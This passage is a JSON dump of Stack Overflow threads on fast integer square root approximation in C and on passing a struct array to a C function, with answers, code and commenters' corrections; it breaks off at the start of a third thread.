"https://stackoverflow.com/users/905902/wildplasser"}, "reply_to_user": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1449702326, "post_id": 34187992, "comment_id": 56127779, "body": "Division speed may be a factor on some architectures. It is fast on x86, (for x &gt;=3, it used to cost 20...60 clocks on 8086, IIRC). Avoiding loops and jumps, (keeping the insn pipeline full) should work on modern intel."}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "reply_to_user": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1449704185, "post_id": 34187992, "comment_id": 56128515, "body": "I just benchmarked, and the <code>a = sqrt (0.0 +val);</code> version is even a bit faster. Still needs an FPU or mmx, though. GCC emits <code>sqrtsd  %xmm0, %xmm1</code>"}, {"owner": {"reputation": 83, "user_id": 3096849, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4dcfa4e0920dce5caf058221b46e865f?s=128&d=identicon&r=PG", "display_name": "Morten", "link": "https://stackoverflow.com/users/3096849/morten"}, "edited": false, "score": 0, "creation_date": 1449726175, "post_id": 34187992, "comment_id": 56134917, "body": "is the inaccuracy using floating point numbers <b>guaranteed</b> to be larger? I don&#39;t think so."}, {"owner": {"reputation": 83, "user_id": 3096849, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4dcfa4e0920dce5caf058221b46e865f?s=128&d=identicon&r=PG", "display_name": "Morten", "link": "https://stackoverflow.com/users/3096849/morten"}, "edited": false, "score": 0, "creation_date": 1449726698, "post_id": 34187992, "comment_id": 56135116, "body": "Your code has about double speed. Now testing x*isqrt(); The Inverse square root thingy has four times the speed."}, {"owner": {"reputation": 4777, "user_id": 5740428, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/955c329acc7388992f247b0b64c4e270?s=128&d=identicon&r=PG&f=1", "display_name": "Jan Schultke", "link": "https://stackoverflow.com/users/5740428/jan-schultke"}, "edited": false, "score": 0, "creation_date": 1597671231, "post_id": 34187992, "comment_id": 112201222, "body": "I would call this implementation relatively useless. Even a simple test case fails:  <code>usqrt(2 * 2) != 2</code>. If I wanted limited precision, I would use floating point numbers, not integers."}, {"owner": {"reputation": 4777, "user_id": 5740428, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/955c329acc7388992f247b0b64c4e270?s=128&d=identicon&r=PG&f=1", "display_name": "Jan Schultke", "link": "https://stackoverflow.com/users/5740428/jan-schultke"}, "edited": false, "score": 1, "creation_date": 1597674902, "post_id": 34187992, "comment_id": 112203390, "body": "To be precise <code>usqrt4(4) == 78</code>, so it fails the requirement that the result is a lower bound."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "reply_to_user": {"reputation": 4777, "user_id": 5740428, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/955c329acc7388992f247b0b64c4e270?s=128&d=identicon&r=PG&f=1", "display_name": "Jan Schultke", "link": "https://stackoverflow.com/users/5740428/jan-schultke"}, "edited": false, "score": 0, "creation_date": 1599373900, "post_id": 34187992, "comment_id": 112751363, "body": "@JanSchultke: The OP actually wants the result to be at least as large as <code>floor(sqrt(n))</code>:  <i>I am currently searching for a very fast integer square root approximation, where floor(sqrt(x)) &lt;= veryFastIntegerSquareRoot(x) &lt;= x</i>. The requirement that fails is <code>veryFastIntegerSquareRoot(x) &lt;= x</code> because <code>usqrt(4) &gt; 4</code>. As a matter of fact the requirement should be <code>veryFastIntegerSquareRoot(x) &lt; x</code> otherwise the prime test running up to and including <code>veryFastIntegerSquareRoot(x)</code> will attempt to divide <code>x</code> by itself, and incorrectly report <code>x</code> as composite. Your answer is far better."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "reply_to_user": {"reputation": 83, "user_id": 3096849, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4dcfa4e0920dce5caf058221b46e865f?s=128&d=identicon&r=PG", "display_name": "Morten", "link": "https://stackoverflow.com/users/3096849/morten"}, "edited": false, "score": 0, "creation_date": 1599373954, "post_id": 34187992, "comment_id": 112751373, "body": "@Morten: This answer has problems and cannot be used for your purpose. You should instead accept Jan Schultke&#39;s answer."}], "tags": [], "owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "is_accepted": true, "score": 2, "last_activity_date": 1503003790, "last_edit_date": 1503003790, "creation_date": 1449691499, "answer_id": 34187992, "question_id": 34187171, "link": "https://stackoverflow.com/questions/34187171/fast-integer-square-root-approximation/34187992#34187992", "title": "fast integer square root approximation", "body": "<p>Loopfree/jumpfree (well: <em>almost</em> ;-) Newton-Raphson:</p>\n\n<pre><code>/* static will allow inlining */\nstatic unsigned usqrt4(unsigned val) {\n    unsigned a, b;\n\n    if (val &lt; 2) return val; /* avoid div/0 */\n\n    a = 1255;       /* starting point is relatively unimportant */\n\n    b = val / a; a = (a+b) /2;\n    b = val / a; a = (a+b) /2;\n    b = val / a; a = (a+b) /2;\n    b = val / a; a = (a+b) /2;\n\n    return a;\n}\n</code></pre>\n\n<p>For 64-bit ints you will need a few more steps (my guess: 6)</p>\n"}, {"comments": [{"owner": {"reputation": 290304, "user_id": 187690, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/89a4da7af5bf1558b7d2704309f1f118?s=128&d=identicon&r=PG", "display_name": "AnT", "link": "https://stackoverflow.com/users/187690/ant"}, "edited": false, "score": 0, "creation_date": 1585430441, "post_id": 45744558, "comment_id": 107757936, "body": "What DIV are you talking about? No self-respecting compiler will translate <code>&#47; 2</code> into a DIV on platform where <code>&gt;&gt; 1</code> is faster. There&#39;s never any reason to replace unsigned <code>&#47; 2</code> with <code>&gt;&gt; 1</code> in C code."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "reply_to_user": {"reputation": 290304, "user_id": 187690, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/89a4da7af5bf1558b7d2704309f1f118?s=128&d=identicon&r=PG", "display_name": "AnT", "link": "https://stackoverflow.com/users/187690/ant"}, "edited": false, "score": 0, "creation_date": 1597679166, "post_id": 45744558, "comment_id": 112205746, "body": "@AnT: I suppose Mindy was referring to the test <code>if (val &lt; 20000)</code> which saves 2 divisions. I wonder whether this test should be <code>val &gt; 20000</code> instead of <code>val &lt; 20000</code>."}], "tags": [], "owner": {"reputation": 11, "user_id": 8480428, "user_type": "unregistered", "profile_image": "https://www.gravatar.com/avatar/2baf8db8e6b2e227cdf21533d3f65d94?s=128&d=identicon&r=PG", "display_name": "Mindy Johnson", "link": "https://stackoverflow.com/users/8480428/mindy-johnson"}, "is_accepted": false, "score": 0, "last_activity_date": 1503003721, "last_edit_date": 1503003721, "creation_date": 1503002233, "answer_id": 45744558, "question_id": 34187171, "link": "https://stackoverflow.com/questions/34187171/fast-integer-square-root-approximation/45744558#45744558", "title": "fast integer square root approximation", "body": "<p>This version can be faster as DIV is slow and for small numbers \n(Val&lt;20k) this version reduces the error to less than 5%.\nTested on ARM M0 (With no DIV hardware acceleration) </p>\n\n<pre><code>static uint32_t usqrt4_6(uint32_t val) {\n    uint32_t a, b;\n\n    if (val &lt; 2) return val; /* avoid div/0 */\n    a = 1255;       /* starting point is relatively unimportant */\n    b = val / a; a = (a + b)&gt;&gt;1;\n    b = val / a; a = (a + b)&gt;&gt;1;\n    b = val / a; a = (a + b)&gt;&gt;1;\n    b = val / a; a = (a + b)&gt;&gt;1;\n    if (val &lt; 20000) {  \n        b = val / a; a = (a + b)&gt;&gt;1;    // &lt; 17% error Max\n        b = val / a; a = (a + b)&gt;&gt;1;    // &lt; 5%  error Max\n    }\n    return a;\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 4777, "user_id": 5740428, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/955c329acc7388992f247b0b64c4e270?s=128&d=identicon&r=PG&f=1", "display_name": "Jan Schultke", "link": "https://stackoverflow.com/users/5740428/jan-schultke"}, "edited": false, "score": 0, "creation_date": 1597676608, "post_id": 45744818, "comment_id": 112204361, "body": "Unlike exponentiation, doing this brute-force approach would take way too long for square roots. There are roughly 2^32 square roots to iterate over when brute-forcing the square root of a 64-bit integer."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "reply_to_user": {"reputation": 4777, "user_id": 5740428, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/955c329acc7388992f247b0b64c4e270?s=128&d=identicon&r=PG&f=1", "display_name": "Jan Schultke", "link": "https://stackoverflow.com/users/5740428/jan-schultke"}, "edited": false, "score": 0, "creation_date": 1597677871, "post_id": 45744818, "comment_id": 112205056, "body": "@J.Schultke: what brute force approach are you referring to? The above code illustrates that square root is not needed for this loop. The goal is to determine the primeness of <code>n</code>, not to compute its square root."}, {"owner": {"reputation": 4777, "user_id": 5740428, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/955c329acc7388992f247b0b64c4e270?s=128&d=identicon&r=PG&f=1", "display_name": "Jan Schultke", "link": "https://stackoverflow.com/users/5740428/jan-schultke"}, "edited": false, "score": 0, "creation_date": 1597678033, "post_id": 45744818, "comment_id": 112205153, "body": "I was not referring to the code, I was referring to what you said in the answer: <i>&quot;you can instead square the candidates and stop when the square exceeds the value of n.&quot;</i>. And if this has nothing to do with square roots, why is it an answer to a square root question?"}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "reply_to_user": {"reputation": 4777, "user_id": 5740428, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/955c329acc7388992f247b0b64c4e270?s=128&d=identicon&r=PG&f=1", "display_name": "Jan Schultke", "link": "https://stackoverflow.com/users/5740428/jan-schultke"}, "edited": false, "score": 1, "creation_date": 1597678705, "post_id": 45744818, "comment_id": 112205499, "body": "@J.Schultke: The OP wrote <i>The square root routine is used for calculating prime numbers, which get considerably faster if only values below or equals sqrt(x) are checked for being a divisor of x.</i> I am suggesting using <code>p * p &lt;= n</code> as a loop test instead of computing <code>sqrt(x)</code>. I am not suggesting finding the square root by linearly testing candidates, which would indeed be completely inappropriate."}], "tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": false, "score": 1, "last_activity_date": 1597678849, "last_edit_date": 1597678849, "creation_date": 1503003368, "answer_id": 45744818, "question_id": 34187171, "link": "https://stackoverflow.com/questions/34187171/fast-integer-square-root-approximation/45744818#45744818", "title": "fast integer square root approximation", "body": "<p>On modern PC hardware, computing the square root of <code>n</code> may well be faster using floating point arithmetics than any kind of fast integer math, but as for all performance issues, careful benchmarking is required.</p>\n<p>Note however that computing the square root may not be required at all: you can instead square the loop index and stop when the square exceeds the value of <code>n</code>.  The dominant operation is the division in the loop body anyway:</p>\n<pre><code>#define PBITS32  ((1&lt;&lt;2) | (1&lt;&lt;3) | (1&lt;&lt;5) | (1&lt;&lt;7) | (1&lt;&lt;11) | (1&lt;&lt;13) | \\\n                  (1UL&lt;&lt;17) | (1UL&lt;&lt;19) | (1UL&lt;&lt;23) | (1UL&lt;&lt;29) | (1UL&lt;&lt;31))\n\nint isprime(unsigned int n) {\n    if (n &lt; 32)\n        return (PBITS32 &gt;&gt; n) &amp; 1;\n    if ((n &amp; 1) == 0)\n        return 0;\n    for (unsigned int p = 3; p * p &lt;= n; p += 2) {\n        if (n % p == 0)\n            return 0;\n    }\n    return 1;\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1597680711, "post_id": 63452286, "comment_id": 112206510, "body": "Your solutions are very interesting as they do not use any divisions. It would be useful to benchmark them against the classic Newton-Raphson method, but on accuracy and performance."}, {"owner": {"reputation": 4777, "user_id": 5740428, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/955c329acc7388992f247b0b64c4e270?s=128&d=identicon&r=PG&f=1", "display_name": "Jan Schultke", "link": "https://stackoverflow.com/users/5740428/jan-schultke"}, "reply_to_user": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1597697430, "post_id": 63452286, "comment_id": 112213471, "body": "@chqrlie it performs roughly en-par with Newton&#39;s method when using <code>sqrt_lo</code> as the initial guess. <a href=\"https://stackoverflow.com/a/63457507/5740428\">See this post for details</a>."}], "tags": [], "owner": {"reputation": 4777, "user_id": 5740428, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/955c329acc7388992f247b0b64c4e270?s=128&d=identicon&r=PG&f=1", "display_name": "Jan Schultke", "link": "https://stackoverflow.com/users/5740428/jan-schultke"}, "is_accepted": false, "score": 1, "last_activity_date": 1599386006, "last_edit_date": 1599386006, "creation_date": 1597672356, "answer_id": 63452286, "question_id": 34187171, "link": "https://stackoverflow.com/questions/34187171/fast-integer-square-root-approximation/63452286#63452286", "title": "fast integer square root approximation", "body": "<h2>Computing <code>floor(sqrt(x))</code> Exactly</h2>\n<p>Here is my solution, which is based on the <a href=\"https://en.wikipedia.org/wiki/Integer_square_root#Using_bitwise_operations\" rel=\"nofollow noreferrer\">bit-guessing approach proposed on Wikipedia</a>. Unfortunately the pseudo-code provided on Wikipedia has some errors so I had to make some adjustments:</p>\n<pre class=\"lang-cpp prettyprint-override\"><code>unsigned char bit_width(unsigned long long x) {\n    return x == 0 ? 1 : 64 - __builtin_clzll(x);\n}\n\n// implementation for all unsigned integer types\nunsigned sqrt(const unsigned n) {\n    unsigned char shift = bit_width(n);\n    shift += shift &amp; 1; // round up to next multiple of 2\n\n    unsigned result = 0;\n\n    do {\n        shift -= 2;\n        result &lt;&lt;= 1; // leftshift the result to make the next guess\n        result |= 1;  // guess that the next bit is 1\n        result ^= result * result &gt; (n &gt;&gt; shift); // revert if guess too high\n    } while (shift != 0);\n\n    return result;\n}\n</code></pre>\n<p><code>bit_width</code> can be evaluated in constant time and the loop will iterate at most <code>ceil(bit_width / 2)</code> times. So even for a 64-bit integer, this will be at worst 32 iterations of basic arithmetic and bitwise operations.</p>\n<p>Unlike all other answers proposed so far, this actually gives you the best possible approximation, which is <code>floor(sqrt(x))</code>. For any x<sup>2</sup>, this will return x exactly.</p>\n<h1>Making a Guess using log<sub>2</sub>(x)</h1>\n<p>If this is still too slow for you, you can make a guess solely based on the binary logarithm. The basic idea is that we can compute the <code>sqrt</code> of any number 2<sup>x</sup> using 2<sup>x/2</sup>. <code>x/2</code> might have a remainder, so we can't always compute this exactly, but we can compute an upper and lower bound.</p>\n<p>For example:</p>\n<ol>\n<li>we are given 25</li>\n<li>compute <code>floor(log_2(25)) = 4</code></li>\n<li>compute <code>ceil(log_2(25)) = 5</code></li>\n<li>lower bound: <code>pow(2, floor(4 / 2)) = 4</code></li>\n<li>upper bound: <code>pow(2, ceil(5 / 2)) = 8</code></li>\n</ol>\n<p>And indeed, the actual <code>sqrt(25) = 5</code>. We found <code>sqrt(16) &gt;= 4</code> and <code>sqrt(32) &lt;= 8</code>. This means:</p>\n<pre class=\"lang-cpp prettyprint-override\"><code>4 &lt;= sqrt(16) &lt;= sqrt(25) &lt;= sqrt(32) &lt;= 8\n            4 &lt;= sqrt(25) &lt;= 8\n</code></pre>\n<p>This is how we can implement these guesses, which we will call <code>sqrt_lo</code> and <code>sqrt_hi</code>.</p>\n<pre class=\"lang-cpp prettyprint-override\"><code>// this function computes a lower bound\nunsigned sqrt_lo(const unsigned n) noexcept\n{\n    unsigned log2floor = bit_width(n) - 1;\n    return (unsigned) (n != 0) &lt;&lt; (log2floor &gt;&gt; 1);\n}\n\n// this function computes an upper bound\nunsigned sqrt_hi(const unsigned n)\n{\n    bool isnt_pow2 = ((n - 1) &amp; n) != 0; // check if n is a power of 2\n    unsigned log2ceil = bit_width(n) - 1 + isnt_pow2;\n    log2ceil += log2ceil &amp; 1; // round up to multiple of 2\n    return (unsigned) (n != 0) &lt;&lt; (log2ceil &gt;&gt; 1);\n}\n</code></pre>\n<p>For these two functions, the following statement is always true:</p>\n<pre><code>sqrt_lo(x) &lt;= floor(sqrt(x)) &lt;= sqrt(x) &lt;= sqrt_hi(x) &lt;= x\n</code></pre>\n<p>Note that if we assume that the input is never zero, then <code>(unsigned) (n != 0)</code> can be simplified to <code>1</code> and the statement is still true.</p>\n<p>These functions can be evaluated in <code>O(1)</code> with a hardware-<code>__builtin_clzll</code> instruction. They only give precise results for numbers 2<sup>2x</sup>, so <code>256</code>, <code>64</code>, <code>16</code>, etc.</p>\n"}], "owner": {"reputation": 83, "user_id": 3096849, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4dcfa4e0920dce5caf058221b46e865f?s=128&d=identicon&r=PG", "display_name": "Morten", "link": "https://stackoverflow.com/users/3096849/morten"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 5681, "favorite_count": 1, "accepted_answer_id": 34187992, "answer_count": 4, "score": 4, "last_activity_date": 1599386006, "creation_date": 1449688637, "last_edit_date": 1503003887, "question_id": 34187171, "link": "https://stackoverflow.com/questions/34187171/fast-integer-square-root-approximation", "title": "fast integer square root approximation", "body": "<p>I am currently searching for a very fast integer square root approximation, where <code>floor(sqrt(x)) &lt;= veryFastIntegerSquareRoot(x) &lt;= x</code></p>\n\n<p>The square root routine is used for calculating prime numbers, which get considerably faster if only values below or equals <code>sqrt(x)</code> are checked for being a divisor of <code>x</code>.</p>\n\n<p>What I am currently having is <a href=\"https://en.wikipedia.org/wiki/Methods_of_computing_square_roots#Example_2\" rel=\"nofollow noreferrer\">this function from Wikipedia</a>, adjusted a small bit to work with 64-bit integers.</p>\n\n<p>Because I have no other function to compare against (or more precise, the function is too precise for my purposes, and it probably takes more time, than being higher than the actual result.)</p>\n"}, {"tags": ["c", "arrays", "function", "structure"], "comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 2, "creation_date": 1449687228, "post_id": 34186748, "comment_id": 56119836, "body": "The initialisations should not even work. You have an array of <code>struct</code>, so you ned nested braces. Also use prototype declarators for functions, the <code>#define</code> is dangerous at best (use the name of the type as argument; do not hard-code the names, this is recipe for disaster)."}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 3, "creation_date": 1449687401, "post_id": 34186748, "comment_id": 56119934, "body": "<code>struct key {... }</code> and <code>typedef struct key Key;</code> move to top(before .<code>void traversal(Key tab[], int n);</code>)"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1449687403, "post_id": 34186748, "comment_id": 56119939, "body": "And, of course: &quot; I failed to pass the structure array&quot; is not a <b>specific</b> problem-description."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1449687742, "post_id": 34186748, "comment_id": 56120126, "body": "@Olaf nested braces are not required the initialisation works perfect in MSVC."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1449705755, "post_id": 34186748, "comment_id": 56129096, "body": "@WeatherVane: MSVC is not really a reference implementation of the C standard. This might be a legacy, but as I understand the <a href=\"http://port70.net/~nsz/c/c11/n1570.html#6.7.9p16\" rel=\"nofollow noreferrer\">standard</a>, this is not allowed (anymore). I know this works for nested arrays, though, but at least gcc warns about it and it is a very bad idea in general, because it is quite error-prone and beginners should definitvely not use it. Actually designated initialisers should be used for <code>structs</code> (although I think for larger hand-typed arrays, a positional intialiser list is acceptable - if properly embraced)."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1449769667, "post_id": 34186748, "comment_id": 56161323, "body": "@Olaf I only discovered that by seeing a question asked here and trying the code. I do use nested braces; for one thing it makes the initialisation easier to read."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1449770376, "post_id": 34186748, "comment_id": 56161708, "body": "@WeatherVane: You are right. Just tested with gcc for <code>gnu11</code>. But once you enable <code>-Wall</code>, you get warnings. And there is no excuse not to enable these warnings or ignore them. So I assume the standard can really be interpreted to allow this legacy. Never used this (very questionable) &quot;feature&quot; and I discourage every beginner to even start using such constructs."}], "answers": [{"tags": [], "owner": {"reputation": 2000, "user_id": 4487286, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YHZoO.jpg?s=128&g=1", "display_name": "milevyo", "link": "https://stackoverflow.com/users/4487286/milevyo"}, "is_accepted": true, "score": 1, "last_activity_date": 1449695580, "last_edit_date": 1449695580, "creation_date": 1449688431, "answer_id": 34187107, "question_id": 34186748, "link": "https://stackoverflow.com/questions/34186748/how-to-pass-a-structure-array-to-a-function-in-c/34187107#34187107", "title": "How to pass a structure array to a function in C?", "body": "<p>declare any struct, or function before using it, not after</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stddef.h&gt;\n#define NKEYS (sizeof keytab/ sizeof (Key))\n\n// define struct first\nstruct key                        // create the structure\n{   char *word;\n    int count;  \n};\ntypedef struct key Key; \n\n//then the functions that uses it\nvoid traversal(Key *tab, int n); \n\n\nKey keytab[]={\n    \"auto\",0,\n    \"break\",0,\n    \"case\",0,\n    \"char\",0,\n    \"const\",0,\n    \"continue\",0,\n    \"default\",0,\n    \"void\",0,\n    \"while\",0,\n};\n\nint main()\n{\n    traversal(keytab,NKEYS);\n    return 0;\n}\n\nvoid traversal(Key* tab, int n){\n    int i;\n    for (i=0; i&lt;n; i++){\n        printf(\"%s\\n\",tab[i].word);\n    }\n} \n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "is_accepted": false, "score": 1, "last_activity_date": 1449688684, "creation_date": 1449688684, "answer_id": 34187193, "question_id": 34186748, "link": "https://stackoverflow.com/questions/34186748/how-to-pass-a-structure-array-to-a-function-in-c/34187193#34187193", "title": "How to pass a structure array to a function in C?", "body": "<p>In the <code>traversal</code> function, you have an argument called <code>tab</code>, but you don't actually use that argument. Instead, you use <code>keytab</code> directly. So the function will always print <code>keytab</code>, even if you pass something else.</p>\n\n<p>Also, you can avoid computing/passing the size of the array by using a <a href=\"https://en.wikipedia.org/wiki/Sentinel_value\" rel=\"nofollow\">sentinel value</a> to mark the end of the array. The value <code>NULL</code> works as a good sentinel when your structure contains a pointer, e.g. <code>word</code>. </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stddef.h&gt;\n\nstruct key                        // create the structure\n{   char *word;\n    int count;\n};\n\ntypedef struct key Key;          //define struct key as Key\n\nKey keytab[]={                   // initiate the struct array\n    { \"auto\",0 },\n    { \"break\",0 },\n    { \"case\",0 },\n    { \"char\",0 },\n    { \"const\",0 },\n    { \"continue\",0 },\n    { \"default\",0 },\n    { \"void\",0 },\n    { \"while\",0 },\n    { NULL,0 }             // sentinel value to mark the end of the array\n};\n\nvoid traversal(Key tab[]){\n    int i;\n    for (i=0; tab[i].word != NULL; i++){\n        printf(\"%s\\n\",keytab[i].word);\n    }\n}\n\nint main( void )\n{\n    traversal(keytab);\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 23, "user_id": 5590594, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/295d765cfc350ce8be76cda94757b057?s=128&d=identicon&r=PG&f=1", "display_name": "Runze Dong", "link": "https://stackoverflow.com/users/5590594/runze-dong"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 5699, "favorite_count": 0, "accepted_answer_id": 34187107, "answer_count": 2, "score": -2, "last_activity_date": 1449695580, "creation_date": 1449687143, "question_id": 34186748, "link": "https://stackoverflow.com/questions/34186748/how-to-pass-a-structure-array-to-a-function-in-c", "title": "How to pass a structure array to a function in C?", "body": "<p>i am a C new learner. and I was confused about this following code, which aims to print all the elements in a structure array. I know it can be done in main() directly, but when I put the printf(....) into a function and call this function, I failed to pass the structure array. \nDoes anybody know why. I'm upset..thanks</p>\n\n<p>my structure includes keyword and its count.  the initialization contains the constant set of names and the its count number 0.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stddef.h&gt;\n#define NKEYS (sizeof keytab/ sizeof (Key))\n\nvoid traversal(Key tab[], int n); // define the function\nstruct key                        // create the structure\n{   char *word;\n    int count;  \n};\ntypedef struct key Key;          //define struct key as Key\nKey keytab[]={                   // initiate the struct array\n    \"auto\",0,\n    \"break\",0,\n    \"case\",0,\n    \"char\",0,\n    \"const\",0,\n    \"continue\",0,\n    \"default\",0,\n    \"void\",0,\n    \"while\",0,\n};\nint main()\n{\n    traversal(keytab,NKEYS);\n    return 0;\n}\n\nvoid traversal(Key tab[], int n){\n    int i;\n    for (i=0; i&lt;n; i++){\n        printf(\"%s\\n\",keytab[i].word);\n    }\n} \n</code></pre>\n"}, {"tags": ["c", "openmp", "xeon-phi"], "comments": [{"owner": {"reputation": 28384, "user_id": 648265, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/4d98e414a47934d66cb78bf73d0845ba?s=128&d=identicon&r=PG", "display_name": "ivan_pozdeev", "link": 